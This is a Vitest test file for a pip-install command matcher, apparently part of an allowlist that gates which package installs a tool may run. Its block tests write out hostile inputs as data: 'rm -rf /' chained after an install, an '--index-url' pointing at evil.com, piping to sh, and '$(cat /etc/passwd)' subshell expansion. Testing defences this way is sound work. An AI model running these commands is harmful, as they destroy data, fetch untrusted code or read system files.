import { describe, it, expect } from "vitest";
import { matchPip3Install } from "../../src/matchers/pip3-install.js";

const PKGS = ["python-dotenv", "requests", "boto3"];

describe("matchPip3Install — wildcard *", () => {
  it("allows any package when * present", () => {
    expect(matchPip3Install("pip3 install anything -q", ["*"])).toBe(true);
  });

  it("allows unknown package with * and echo suffix", () => {
    expect(matchPip3Install('pip3 install some-random-pkg && echo "ok"', ["*"])).toBe(true);
  });
});

describe("matchPip3Install — venv + path pip", () => {
  const VENV = "/Users/aditya/source/insta-analyzer/.venv";

  it("allows python3 -m venv alone", () => {
    expect(matchPip3Install(`python3 -m venv ${VENV}`, PKGS)).toBe(true);
  });

  it("allows venv && pip install", () => {
    expect(matchPip3Install(
      `python3 -m venv ${VENV} && ${VENV}/bin/pip install python-dotenv -q`,
      PKGS
    )).toBe(true);
  });

  it("allows venv && pip install && echo", () => {
    expect(matchPip3Install(
      `python3 -m venv ${VENV} && ${VENV}/bin/pip install python-dotenv -q && echo "ok"`,
      PKGS
    )).toBe(true);
  });

  it("allows pip (not pip3) by basename", () => {
    expect(matchPip3Install(`${VENV}/bin/pip install python-dotenv -q`, PKGS)).toBe(true);
  });

  it("blocks unlisted package via venv pip", () => {
    expect(matchPip3Install(`${VENV}/bin/pip install evil-pkg`, PKGS)).toBe(false);
  });

  it("blocks venv with extra flags", () => {
    expect(matchPip3Install(`python3 -m venv --copies ${VENV}`, PKGS)).toBe(false);
  });

  it("blocks echo before pip", () => {
    expect(matchPip3Install(
      `echo "start" && ${VENV}/bin/pip install python-dotenv`,
      PKGS
    )).toBe(false);
  });

  it("blocks || operator", () => {
    expect(matchPip3Install(
      `python3 -m venv ${VENV} || echo "failed"`,
      PKGS
    )).toBe(false);
  });

  it("blocks pipe between segments", () => {
    expect(matchPip3Install(
      `python3 -m venv ${VENV} | cat`,
      PKGS
    )).toBe(false);
  });
});

describe("matchPip3Install — allow", () => {
  it("bare install", () => {
    expect(matchPip3Install("pip3 install python-dotenv", PKGS)).toBe(true);
  });

  it("-q flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv -q", PKGS)).toBe(true);
  });

  it("--quiet flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --quiet", PKGS)).toBe(true);
  });

  it("-U flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv -U", PKGS)).toBe(true);
  });

  it("--upgrade flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --upgrade", PKGS)).toBe(true);
  });

  it("--user flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --user", PKGS)).toBe(true);
  });

  it("version specifier stripped", () => {
    expect(matchPip3Install("pip3 install python-dotenv==1.0.0 -q", PKGS)).toBe(true);
  });

  it("version range stripped", () => {
    expect(matchPip3Install("pip3 install requests>=2.0 -q", PKGS)).toBe(true);
  });

  it("multiple allowed packages", () => {
    expect(matchPip3Install("pip3 install python-dotenv requests -q", PKGS)).toBe(true);
  });

  it("&& echo suffix", () => {
    expect(matchPip3Install('pip3 install python-dotenv -q && echo "ok"', PKGS)).toBe(true);
  });

  it("&& echo without quotes", () => {
    expect(matchPip3Install("pip3 install python-dotenv -q && echo ok", PKGS)).toBe(true);
  });
});

describe("matchPip3Install — block", () => {
  it("unlisted package", () => {
    expect(matchPip3Install("pip3 install evil-package", PKGS)).toBe(false);
  });

  it("one unlisted in multi-package install", () => {
    expect(matchPip3Install("pip3 install python-dotenv evil-package", PKGS)).toBe(false);
  });

  it("no package — only flags", () => {
    expect(matchPip3Install("pip3 install -q", PKGS)).toBe(false);
  });

  it("unknown flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --index-url https://evil.com", PKGS)).toBe(false);
  });

  it("requirements file flag", () => {
    expect(matchPip3Install("pip3 install -r requirements.txt", PKGS)).toBe(false);
  });

  it("&& non-echo command", () => {
    expect(matchPip3Install("pip3 install python-dotenv && rm -rf /", PKGS)).toBe(false);
  });

  it("three-segment chain", () => {
    expect(matchPip3Install("pip3 install python-dotenv && echo ok && sh", PKGS)).toBe(false);
  });

  it("pipe to sh", () => {
    expect(matchPip3Install("pip3 install python-dotenv | sh", PKGS)).toBe(false);
  });

  it("pip (not pip3) now allowed by basename", () => {
    expect(matchPip3Install("pip install python-dotenv", PKGS)).toBe(true);
  });

  it("empty allowed_packages", () => {
    expect(matchPip3Install("pip3 install python-dotenv", [])).toBe(false);
  });

  it("* still blocks unknown flags", () => {
    expect(matchPip3Install("pip3 install anything --index-url https://evil.com", ["*"])).toBe(false);
  });

  it("* still blocks && non-echo", () => {
    expect(matchPip3Install("pip3 install anything && rm -rf /", ["*"])).toBe(false);
  });

  it("subshell expansion blocked", () => {
    expect(matchPip3Install("pip3 install $(cat /etc/passwd)", PKGS)).toBe(false);
  });
});
